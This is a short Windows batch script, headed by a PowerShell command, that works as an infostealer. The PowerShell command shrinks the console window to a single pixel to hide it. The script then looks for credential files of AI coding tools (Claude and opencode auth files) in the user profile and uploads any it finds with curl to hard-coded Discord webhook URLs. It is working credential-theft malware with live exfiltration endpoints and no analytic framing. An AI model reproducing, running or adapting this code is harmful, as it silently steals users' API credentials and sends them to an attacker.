powershell -command "& {Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Win { [DllImport(\"user32.dll\")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags); [DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); }'; [void][Win]::SetWindowPos([Win]::GetConsoleWindow(), [IntPtr]::Zero, 1, 1, 1, 1, 0x0040)}"
@echo off
set "FILEEE=%userprofile%\.claude\credentials.json"
set "FILEE=%userprofile%\.claude\.credentials.json"
set "FILE=%userprofile%\.local\share\opencode\auth.json"
set "WEBHOOKA=https://discord.com/api/webhooks/1509347871974101152/KzKcfHkJXnUaZFDIIk0lceB7Rys8Hvj6V4V-38LUlhaMvX4IkIXCr2MfW-nqyMjBSh0K"
set "WEBHOOK=https://discord.com/api/webhooks/1509356918148169920/Gl98LVlee9vJ6mM6ZOgfHFnen8ILV9mZs24bgvhSdQ2TsVqBlLKuSIwVqabMA3ztWcle"
if exist "%FILE%" (
curl -H "Content-Type: application/json" ^ -X POST ^ -d "{\"content\":\"
json\n\"}" ^
    %WEBHOOKA%
curl -F "file=@%FILE%" %WEBHOOKA%
)
if exist "%FILEE%" (
curl -H "Content-Type: application/json" ^ -X POST ^ -d "{\"content\":\"
json\n\"}" ^
    %WEBHOOK%
curl -F "file=@%FILEE%" %WEBHOOK%
)
if exist "%FILEEE%" (
curl -H "Content-Type: application/json" ^ -X POST ^ -d "{\"content\":\"
json\n\"}" ^
    %WEBHOOK%
curl -F "file=@%FILEEE%" %WEBHOOK%
)
